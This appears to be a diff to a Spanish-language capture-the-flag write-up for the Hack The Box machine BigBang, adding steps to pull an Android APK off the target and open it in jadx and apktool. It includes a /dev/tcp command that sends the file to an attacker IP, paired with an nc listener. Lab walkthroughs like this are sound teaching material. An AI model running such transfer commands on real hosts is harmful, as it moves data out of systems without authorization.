@@ -210,22 +210,25 @@ ssh developer@blog.bigbang.htb
 </code></pre>
 <img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20180158.png?raw=true" alt="Captura de pantalla">
 <p>Aquie tenemos algo parecido a lo que hicimos con el usurio anterior cd /android/ satellite-app.apk</p>
-
-
 <pre><code>
-             
+cat  satellite-app.apk > /dev/tcp/10.10.14.26/4444
+nc -lvnp 4444 > satellite-app.apk
 </code></pre>
-
-
-
-
+<p>Para abrir esta apk debemos tener apktool,jadx </p>
 <pre><code>
-             
+sudo apt update
+sudo apt install jadx
+https://github.com/iBotPeaches/Apktool
 </code></pre>
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20012134.png?raw=true" alt="Captura de pantalla">
+<p>Ahora que la herramienta nos ayudo a copilar los archivo podemos abrir nuestro archivos en jadx</p>
+<pre><code>
+sudo apt update
+sudo apt install jadx
+jadx-gui
+</code></pre>
+<p>¡Abre esa satellite-app.apk en esto y verifica que haya una parte interesante! Vemos que la aplicación está en el puerto 9090 Rastreando hacia atrás la función MainActivity, descubrimos un método Login que usa un oyente personalizado. Al examinar el agente de escucha, encontramos métodos que interactúan con un punto final enviando</p>
 
-
-<p>.</p>
-<p>.</p>
 <p>.</p>
 <p>.</p>
 <p>.</p>
